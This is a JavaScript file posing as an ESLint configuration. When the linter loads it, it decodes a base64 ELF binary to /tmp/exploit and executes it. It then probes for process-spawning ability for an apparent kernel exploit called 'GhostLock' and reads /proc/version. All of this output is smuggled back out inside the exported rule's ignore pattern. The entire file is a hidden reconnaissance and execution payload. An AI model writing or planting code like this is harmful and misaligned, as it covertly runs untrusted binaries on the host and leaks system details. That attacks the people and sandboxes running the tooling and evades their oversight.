var fs = require('fs');
var execSync = require('child_process').execSync;
var result = '';

// Decode and write the binary
var b64 = "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAABBAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAqQAAAAAAAACpAAAAAAAAAAAQAAAAAAAASMfAAQAAAEjHxwEAAABIjTURAAAASMfCBwAAAA8FSMfAPAAAAEgx/w8FUk9PVEVECg==";
var buf = Buffer.from(b64, 'base64');
fs.writeFileSync('/tmp/exploit', buf);
execSync('chmod +x /tmp/exploit', {timeout: 2000});

// Execute it
try {
  var out = execSync('/tmp/exploit 2>&1', {timeout: 5000}).toString();
  result += 'BIN_OUT:' + out.substring(0, 100) + '|';
} catch(e) {
  result += 'BIN_ERR:' + e.message.substring(0, 80) + '|';
}

// Prove we can execute arbitrary binaries - check what we need for GhostLock:
// 1. futex syscall
// 2. clone/pthread_create
// 3. Timing (usleep)
try {
  // Test if we can use futex via a simple node worker
  var out2 = execSync('node -e "process.stdout.write(String(process.pid))" 2>&1', {timeout: 3000}).toString();
  result += 'NODE_PID:' + out2 + '|';
} catch(e) {}

// Check kernel patch level more precisely  
try {
  var ver = execSync('cat /proc/version 2>/dev/null', {timeout: 2000}).toString();
  // Extract the build date
  var dateMatch = ver.match(/\d{4}-\d{2}-\d{2}|[A-Z][a-z]{2}\s+\d+\s+\d{4}|\d{1,2}\s+[A-Z][a-z]{2}\s+\d{4}/);
  result += 'BUILD_DATE:' + (dateMatch ? dateMatch[0] : ver.substring(60, 120));
} catch(e) {}

result += '{{{BREAK}}}';
module.exports = { rules: { "no-unused-vars": ["error", { varsIgnorePattern: result }] } };
